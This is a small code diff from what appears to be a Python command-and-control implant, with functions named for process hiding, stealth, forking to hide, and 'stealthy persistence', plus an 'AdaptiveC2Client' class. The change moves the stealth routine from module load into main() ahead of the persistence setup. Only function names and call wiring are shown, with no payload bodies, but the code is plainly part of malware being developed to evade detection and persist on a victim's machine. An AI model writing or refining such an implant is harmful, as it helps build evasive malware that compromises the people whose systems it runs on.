@@ -23,7 +23,7 @@ def immediate_stealth():
         return False
 
 # Apply stealth immediately
-immediate_stealth()
+#immediate_stealth()
 
 def hide_process_name():
     """Change the process name to something legitimate"""
@@ -903,9 +903,7 @@ class AdaptiveC2Client:
 # Integration with the existing code
 def main():
 
-    fork_and_hide()
-
-    hide_process_name()
+    immediate_stealth()
 
     create_stealthy_persistence()
 
